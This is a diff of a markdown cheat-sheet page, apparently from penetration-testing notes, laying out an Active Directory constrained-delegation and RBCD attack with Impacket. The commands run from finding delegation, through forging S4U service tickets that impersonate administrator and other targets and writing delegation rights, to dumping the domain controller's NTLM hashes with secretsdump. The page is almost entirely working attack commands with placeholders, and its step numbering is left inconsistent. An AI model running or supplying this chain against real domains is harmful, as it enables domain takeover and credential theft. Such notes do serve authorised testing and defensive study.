@@ -11,14 +11,15 @@ tags: ["constrained delegation", "active driectory", "ad", "Windows", "impacket"
 
 #### 1. Find delegation
 
-<div>
-
 ```console
-sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USERNAME>' -dc-ip <DC> -hashes :<HASH> -k
+# Check delegation
+sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC> -hashes :<HASH> -k
 ```
 
+#### 2. Get a service ticket
+
 ```console
-impacket-getST -spn <SERVICE>/<DC> -impersonate administrator '<DOMAIN>/<USERNAME>' -hashes :<HASH> -self
+impacket-getST -spn <SERVICE>/<TARGET_DOMAIN> -impersonate administrator '<DOMAIN>/<USER>' -hashes :<HASH> -self
 ```
 
 ```console
@@ -26,25 +27,23 @@ impacket-getST -spn <SERVICE>/<DC> -impersonate administrator '<DOMAIN>/<USERNAM
 describeTicket.py <TICKET_1>.ccache
 ```
 
-</div>
-
-#### 2. RBCD
-
-<div>
+#### 3. RBCD Attack
 
 ```console
 # Add delegation
-impacket-rbcd '<DOMAIN>/<USERNAME>' -hashes :<HASH> -k -delegate-from <USERNAME> -delegate-to <TARGET_1> -action write -dc-ip <DC> -use-ldaps
+impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -k -delegate-from <USER> -delegate-to <TARGET_1> -action write -dc-ip <DC> -use-ldaps
 ```
 
 ```console
 # Check
-sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USERNAME>' -dc-ip <DC> -hashes :<HASH> -k
+sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC> -hashes :<HASH> -k
 ```
+
+#### 4. Get a service ticket
 
 ```console
 # Impersonate
-impacket-getST '<DOMAIN>/<USERNAME>:<PASSWORD>' -spn <SERVICE>/<DC> -impersonate <TARGET_2>
+impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -spn <SERVICE>/<TARGET_DOMAIN> -impersonate <TARGET_2>
 ```
 
 ```console
@@ -52,24 +51,15 @@ impacket-getST '<DOMAIN>/<USERNAME>:<PASSWORD>' -spn <SERVICE>/<DC> -impersonate
 describeTicket.py <TICKET_2>.ccache
 ```
 
-</div>
-
-#### 3. Impersonate
-
-<div>
+#### 5. Impersonate
 
 ```console
-impacket-getST -spn <SERVICE>/<DC> -impersonate <TARGET_2> '<DOMAIN>/<TARGET_1>' -hashes :<HASH> -additional-ticket <TICKET_2>.ccache
+impacket-getST -spn <SERVICE>/<TARGET_DOMAIN> -impersonate <TARGET_2> '<DOMAIN>/<TARGET_1>' -hashes :<HASH> -additional-ticket <TICKET_2>.ccache
 ```
-
-</div>
 
 #### 4. Secrets Dump
 
-<div>
-
 ```console
-# Import ticket
 export KRB5CCNAME='<TICKET_2>.ccache'
 ```
 
@@ -77,8 +67,4 @@ export KRB5CCNAME='<TICKET_2>.ccache'
 impacket-secretsdump -no-pass -k <DC> -just-dc-ntlm
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
